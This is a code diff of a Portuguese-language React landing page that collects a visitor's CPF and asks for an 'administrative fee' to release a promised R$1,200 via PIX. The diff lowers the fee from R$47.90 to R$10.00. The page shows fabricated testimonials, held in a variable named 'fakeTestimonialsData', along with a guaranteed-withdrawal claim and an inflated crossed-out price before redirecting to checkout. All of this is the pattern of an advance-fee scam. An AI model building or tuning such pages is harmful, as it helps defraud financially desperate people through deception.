@@ -24,14 +24,14 @@ const fakeTestimonialsData: Testimonial[] = [
    {
     name: "MARIA S.",
     location: "Fortaleza/CE",
-    text: "Paguei a taxa de R$47,90 com o <strong>CU NA MÃO</strong>, mas para minha surpresa... <strong>CAIU NA HORA!</strong> R$1.200,00 limpos na conta! Essa grana <strong>SALVOU MEU MÊS E MINHA VIDA!</strong> Simplesmente <strong>FODAA!</strong>",
+    text: "Paguei a taxa com o <strong>CU NA MÃO</strong>, mas para minha surpresa... <strong>CAIU NA HORA!</strong> R$1.200,00 limpos na conta! Essa grana <strong>SALVOU MEU MÊS E MINHA VIDA!</strong> Simplesmente <strong>FODAA!</strong>",
     photoUrl: "https://placehold.co/56x56.png",
     dataAiHint: "person avatar"
   },
   {
     name: "J. COSTA",
     location: "Interior de MG",
-    text: "No começo, achei que era <strong>ENGANAÇÃO TOTAL</strong>, mas arrisquei os R$47,90. Qual não foi minha surpresa quando vi o PIX de <strong>R$1.200,00 CAIR NA CONTA em MINUTOS!</strong> Dinheiro extra que <strong>ME TIROU DO SUFOCO!</strong> Recomendo DEMAIS!",
+    text: "No começo, achei que era <strong>ENGANAÇÃO TOTAL</strong>, mas arrisquei a taxa. Qual não foi minha surpresa quando vi o PIX de <strong>R$1.200,00 CAIR NA CONTA em MINUTOS!</strong> Dinheiro extra que <strong>ME TIROU DO SUFOCO!</strong> Recomendo DEMAIS!",
     photoUrl: "https://placehold.co/56x56.png",
     dataAiHint: "person avatar"
   },
@@ -74,10 +74,10 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
   }, []);
 
   const handleLiberarAcessoClick = () => {
-    console.log("LIBERAR ACESSO IMEDIATO AGORA clicado! CPF:", cpf, "Redirect to R$47,90 checkout.");
+    console.log("LIBERAR ACESSO IMEDIATO AGORA clicado! CPF:", cpf, "Redirect to R$10,00 checkout.");
     // Replace with actual redirect to AppMax checkout URL
     window.location.href = "https://appmax.com.br/checkout-url-example"; 
-    alert("🚨 ATENÇÃO: Você será redirecionado para o pagamento SEGURO da taxa administrativa de R$47,90. Liberação dos R$1.200,00 IMEDIATA após confirmação do PIX!");
+    alert("🚨 ATENÇÃO: Você será redirecionado para o pagamento SEGURO da taxa administrativa de R$10,00. Liberação dos R$1.200,00 IMEDIATA após confirmação do PIX!");
   };
 
   const formattedCpf = cpf || '***.***.***-**';
@@ -173,9 +173,9 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
           </h3>
           <p className="text-muted-foreground line-through text-2xl md:text-3xl mb-0">DE R$297,00</p>
           <p className="text-7xl md:text-8xl font-extrabold text-accent mb-1">
-            R$47<span className="text-5xl md:text-6xl align-top">,90</span>
+            R$10<span className="text-5xl md:text-6xl align-top">,00</span>
           </p>
-          <p className="text-lg md:text-xl font-bold text-primary mb-2 uppercase">(VOCÊ ACABA DE ECONOMIZAR R$249,10 HOJE!)</p>
+          <p className="text-lg md:text-xl font-bold text-primary mb-2 uppercase">(VOCÊ ACABA DE ECONOMIZAR R$287,00 HOJE!)</p>
           <p className="text-sm md:text-md text-foreground/90 max-w-lg mx-auto">
             <strong>IMPORTANTE:</strong> Pague <strong>SOMENTE AGORA</strong> esta taxa para cobrir os custos de <strong>processamento SEGURO</strong> e <strong>liberação automática</strong> dos seus R$1.200,00 via PIX! <strong className="text-accent underline">SAQUE GARANTIDO IMEDIATAMENTE APÓS O PIX!</strong>
           </p>
@@ -232,5 +232,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
 };
 
 export default OfferStep;
+
+    
 
     
